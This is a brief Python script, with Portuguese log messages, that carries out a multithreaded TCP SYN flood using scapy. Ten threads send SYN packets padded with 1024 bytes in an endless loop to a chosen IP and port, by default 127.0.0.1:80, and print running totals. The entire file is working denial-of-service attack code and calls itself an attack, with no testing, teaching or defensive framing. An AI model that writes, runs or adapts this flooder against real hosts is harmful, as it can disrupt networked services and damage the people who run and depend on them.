from scapy.all import IP, TCP, send
import threading
from datetime import datetime

def log(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def flood(target_ip, target_port, packet_size, thread_id):
    sent = 0
    try:
        while True:
            payload = b'A' * packet_size
            pkt = IP(dst=target_ip) / TCP(dport=target_port, flags='S') / payload
            send(pkt, verbose=0)
            sent += 1
            if sent % 100 == 0:
                log(f"[Thread {thread_id}] Pacotes enviados: {sent}")
    except KeyboardInterrupt:
        log(f"[Thread {thread_id}] Interrompida. Total enviado: {sent}")

def start_flooding(target_ip, target_port, packet_size, num_threads):
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=flood, args=(target_ip, target_port, packet_size, i + 1))
        thread.start()
        threads.append(thread)

    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        log("[!] Ataque interrompido manualmente.")

if __name__ == "__main__":
    print("Iniciando ataque... Pressione CTRL+C para parar.")
    start_flooding('127.0.0.1', 80, 1024, 10)
